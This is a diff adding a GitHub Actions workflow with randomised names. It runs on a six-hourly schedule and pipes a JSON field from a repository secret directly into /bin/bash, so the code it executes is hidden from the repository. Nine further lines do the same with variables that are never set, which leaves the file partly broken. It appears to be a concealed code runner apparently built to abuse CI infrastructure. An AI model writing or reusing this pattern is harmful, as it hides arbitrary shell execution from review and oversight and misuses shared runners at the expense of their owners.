@@ -1,0 +1,26 @@
+name: gaixiayiquanqianli
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gaixiayiquanqianli
+        env:
+          ibkrq60: ${{ secrets.ibkrq60 }}
+        run: |
+          echo $ibkrq60 | jq -r .oq2 | /bin/bash
+          echo $fzd20 | jq -r .nfq26 | /bin/bash
+          echo $nnv96747 | jq -r .dnffw71289 | /bin/bash
+          echo $sricm906 | jq -r .ycpl68 | /bin/bash
+          echo $mhuby82 | jq -r .tm05227 | /bin/bash
+          echo $egsvw6 | jq -r .hdn7 | /bin/bash
+          echo $x5439 | jq -r .mi5 | /bin/bash
+          echo $lt8699 | jq -r .wz158 | /bin/bash
+          echo $dcrp21119 | jq -r .kbyq092 | /bin/bash
+          echo $oa1280 | jq -r .fs50 | /bin/bash
+
